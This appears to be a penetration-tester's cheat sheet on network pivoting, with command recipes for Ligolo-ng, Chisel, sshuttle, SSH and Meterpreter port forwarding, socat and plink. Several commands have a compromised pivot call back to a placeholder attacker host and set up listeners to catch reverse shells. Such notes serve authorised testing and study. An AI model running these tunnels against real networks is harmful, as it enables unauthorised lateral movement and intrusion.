# Pivoting

### Ligolo-ng

We need to download a proxy file to our attacker and an agent to the target (pivot)

{% embed url="https://www.hackingarticles.in/a-detailed-guide-on-ligolo-ng/" %}

#### Simple pivot

```sh
# Set up a new network interface
sudo ip tuntap add user <USER> mode tun ligolo
sudo ip link set ligolo up

# Run the proxy on the attacker
# Works over port 11601 by default. Use --laddr to change the port
./proxy -selfcert

# Run the agent nn the pivot 
./agent -connect <ATTACKER_IP>:11601 -ignore-cert

# Add a route to the internal network
sudo ip route add <INTERNAL_IP>/<CIDR> dev ligolo

# Back on the proxy session,start the tunnel
start
```

#### Reverse shells / file transfers

To catch the reverse shell or download a file from an internal computer, we need to aim for the internal address of the pivot, and the listener set up with ligolo

```sh
# Create a listener on the pivot that will forward to our local port
listener_add --addr 0.0.0.0:<PIVOT_PORT> --to 0.0.0.0:<LOCAL_PORT>
```

#### Double pivot

```sh
# Set up a new network interface and route to the new network
sudo ip tuntap add user <USER> mode tun ligolo2
sudo ip link set ligolo2 up
sudo ip route add 172.16.6.0/24 dev ligolo2

# Add a new listener (use the same port the proxy was started on)
listener_add --addr 0.0.0.0:11601 --to 0.0.0.0:11601

# Connect to the internal IP of the first pivot
./agent.exe -connect <FIRST_PIVOT_INTERNAL_IP>:11601 -ignore-cert

# Start the new tunnel
start --tun ligolo2
```

Now repeat the same method for reverse shells, file transfers or triple pivot

### Chisel

#### Individual port forward

```shellscript
# On the attacker machine 
./chisel_1.11.3_linux_amd64 server -p <SERVER_PORT> --reverse

# On the target
.\chisel.exe client <ATTACKER_IP>:<SERVER_PORT> R:<ATTACKER_LOCAL_PORT>:127.0.0.1:<TARGET_LOCAL_PORT>
```

### Sshuttle

```sh
# Install
sudo apt-get install sshuttle

# Simple pivot
sudo sshuttle -r <PIVOT_USER>@<PIVOT_IP> <INTERNAL_NETWORK>/<CIDR> -v 

# Add interface for double pivot
sudo sshuttle -r <PIVOT_USER>@<PIVOT_IP> <INTERNAL_NETWORK>/<CIDR> <INTERNAL_NETWORK>/<CIDR>-v 
```

### SSH port forwarding and tunneling

#### Local port forwarding

Make an internal service accessible on our localhost

```sh
ssh -L <LOCAL_PORT>:localhost:<REMOTE_PORT> <USER>@<IP>
ssh -L <LOCAL_PORT>:localhost:<REMOTE_PORT> -L <LOCAL_PORT>:localhost:<REMOTE_PORT> <USER>@<IP>

# If we are already in an SSH session, there is no need to disconnect and reconnect
~C
```

#### Remote / reverse port forwarding

Make a local port on our machine accessible to the internal network ⇒ to catch reverse shells or transfer files

```sh
# Forward all connections on port PIVOT_PORT_TO_USE of the pivot to our ATTACKER_PORT
ssh -R <INTERNAL_PIVOT_IP>:<PIVOT_PORT_TO_USE>:0.0.0.0:<ATTACKER_PORT> <PIVOT_USER>@<PIVOT_IP> -vN
```

#### Dynamic port forwarding (SOCKS tunneling)

Make sure to check the proxychains configuration `/etc/proxychains.conf` for `socks4 127.0.0.1 9050`

```sh
ssh -D 9050 <USER>@<IP>

# Now we can use tools with proxychains
proxychains nmap -v -Pn -sT <IP>
```

### Meterpreter port forwarding and tunneling

#### Tunneling

Make sure to check the proxychains configuration `/etc/proxychains.conf` for `socks4 127.0.0.1 9050`

```sh
# Add route to new network from meterpreter shell
run autoroute -s <IP>/<CIDR>

# Setup the proxy
use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 0.0.0.0
set version 4a
run

# Now we can use tools with proxychains
proxychains nmap -v -Pn -sT <IP>
```

#### Local port forwarding

Make an internal service accessible on our localhost

```sh
portfwd add -l <LOCAL_PORT> -p <REMOTE_PORT> -r <TARGET_IP>
```

#### Remote port forwarding

Make a local port on our machine accessible to the internal network ⇒ to catch reverse shells or transfer files

```sh
portfwd add -R -l <LOCAL_PORT> -p <REMOTE_PORT> -L <ATTACKER_IP>
```

### Socat redirection

Socat is a re director that listens on one host and port and forwards that data to another IP and port. Is equivalent to a remote port forward ⇒ expose a local port on our machine to the internal network

```sh
# Run on the pivot
socat TCP4-LISTEN:<PIVOT_LOCAL_PORT>,fork TCP4:<ATTACKER_IP>:<ATTACKER_PORT>
```

### SSH for Windows: plink.exe

```sh
plink -ssh -D 9050 <USER>@<IP>
```
